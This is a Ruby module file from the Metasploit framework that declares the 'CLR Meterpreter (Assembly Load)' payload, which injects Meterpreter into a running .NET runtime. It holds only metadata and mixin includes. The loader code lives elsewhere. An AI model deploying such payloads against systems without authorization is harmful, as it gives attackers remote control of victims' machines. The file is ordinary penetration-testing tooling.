##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/clr/meterpreter_loader'
require 'msf/base/sessions/meterpreter_clr_clr'
require 'msf/base/sessions/meterpreter_options'

###
#
# Injects the meterpreter server DLL via the Assembly.Load()
# along with transport related configuration.
#
###

module MetasploitModule

  include Msf::Payload::Clr::MeterpreterLoader
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'CLR Meterpreter (Assembly Load)',
      'Description'   => 'Inject the meterpreter server DLL via Assembly.Load() into the currently running CLR instance',
      'Author'        => ['OJ Reeves'],
      'PayloadCompat' => {},
      'Platform'      => 'clr',
      'Arch'          => ARCH_CLR,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Clr_Clr
    ))
  end
end
